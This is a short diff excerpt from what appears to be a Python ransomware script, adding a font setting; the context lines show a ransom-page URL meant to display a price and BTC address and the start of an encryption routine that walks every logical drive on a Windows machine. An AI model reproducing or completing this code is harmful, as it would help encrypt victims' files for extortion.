@@ -7,6 +7,7 @@ homedir = "C:\Users\Python\Desktop\Ransom\File"
 path = os.path.join(homedir, "firstdir")
 url = "https://github.com/luisxciv/SYrans" #Ransom page to display with price, BTC address etc...
 new = 2 # opens in new tab (if possible)
+LARGE_FONT= ("Verdana", 10)
 
 def encryption(key):
     for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
